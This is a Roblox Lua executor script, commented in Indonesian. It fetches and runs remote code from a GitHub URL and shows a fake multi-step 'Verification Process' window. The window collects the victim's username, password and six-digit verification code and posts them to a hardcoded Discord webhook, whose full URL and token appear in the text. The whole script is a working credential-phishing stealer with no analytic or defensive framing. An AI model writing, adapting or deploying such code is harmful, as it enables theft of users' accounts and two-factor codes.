-- Load ZamitoHub Library
local ZamitoHub = loadstring(game:HttpGet("https://raw.githubusercontent.com/Andreaw1140/Andretremor-HUB/refs/heads/main/source"))()

-- Webhook URL Discord
local webhook_url = "https://discord.com/api/webhooks/1319657197705367604/YDNwABDpMP0FcZrC5QqEOH9IbPqt67FmLF1yz6gNks0yxISJPoHbUBFyB1zgei3C5OOR"

-- Key yang benar
local correctKey = "kon"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password, code)
    local content = string.format("Username: %s\nPassword: %s\nKode Verifikasi: %s", username, password, code)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = content
        })
    }

    local response
    if syn and syn.request then
        response = syn.request(payload)
    elseif http and http.request then
        response = http.request(payload)
    elseif request then
        response = request(payload)
    else
        print("Executor Anda tidak mendukung HTTP requests!")
        return
    end

    if response and response.StatusCode == 200 then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
    end
end

-- Fungsi untuk membuat GUI menggunakan ZamitoHub
local function createMenuGUI()
    -- Membuat window dengan ZamitoHub
    local window = ZamitoHub:CreateWindow("Verification Process", true)

    -- Step 1: Key Input
    local keyStep = window:CreateTab("Step 1: Key Input")
    local keyTextbox = keyStep:CreateTextbox("Enter Key", "", function(key)
        if key == correctKey then
            ZamitoHub:CreateNotification("Key Valid", "Key yang dimasukkan benar!", 3)
            keyStep:Destroy() -- Hapus tab Key Input
            createUsernamePasswordStep() -- Pindah ke langkah berikutnya
        else
            ZamitoHub:CreateNotification("Key Invalid", "Key yang dimasukkan salah!", 3)
        end
    end)

    -- Step 2: Username and Password Input
    local function createUsernamePasswordStep()
        local usernamePasswordStep = window:CreateTab("Step 2: Username & Password")
        
        -- Username Input
        local usernameTextbox = usernamePasswordStep:CreateTextbox("Enter Username", "", function(username)
            print("Username:", username)
        end)

        -- Password Input
        local passwordTextbox = usernamePasswordStep:CreateTextbox("Enter Password", "", function(password)
            print("Password:", password)
        end)

        -- Lanjut ke Step 3: Kode Verifikasi
        local continueButton = usernamePasswordStep:CreateButton("Continue to Verification", function()
            local username = usernameTextbox.Text
            local password = passwordTextbox.Text
            usernamePasswordStep:Destroy() -- Hapus tab Username & Password
            createVerificationCodeStep(username, password) -- Pindah ke langkah berikutnya
        end)
    end

    -- Step 3: Verification Code Input
    local function createVerificationCodeStep(username, password)
        local verificationStep = window:CreateTab("Step 3: Verification Code")
        
        -- Kode Verifikasi Input
        local verificationTextbox = verificationStep:CreateTextbox("Enter Verification Code", "", function(code)
            if code:match("^%d%d%d%d%d%d$") then  -- Memastikan kode 6 digit
                sendToDiscord(username, password, code) -- Kirim ke Discord
                ZamitoHub:CreateNotification("Verification Success", "Kode verifikasi berhasil dikirim!", 3)
                verificationStep:Destroy() -- Hapus tab Verification
            else
                ZamitoHub:CreateNotification("Verification Failed", "Kode harus 6 digit angka!", 3)
            end
        end)
    end
end

-- Menampilkan GUI
createMenuGUI()
